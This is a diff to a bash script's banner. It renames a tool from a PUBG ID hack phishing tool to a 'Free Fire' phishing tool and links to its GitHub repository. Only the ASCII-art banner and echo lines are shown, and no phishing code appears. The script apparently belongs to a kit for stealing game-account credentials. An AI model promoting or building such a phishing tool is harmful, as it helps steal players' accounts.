@@ -29,7 +29,7 @@ echo -e "\e[95m
      ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
   echo""    
-  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m PUBG ID HACK PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.2] \e[0m'                                       
+  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m FREE FIRE PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.2] \e[0m'                                       
   echo ""
    echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- \e[36mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
    echo ""
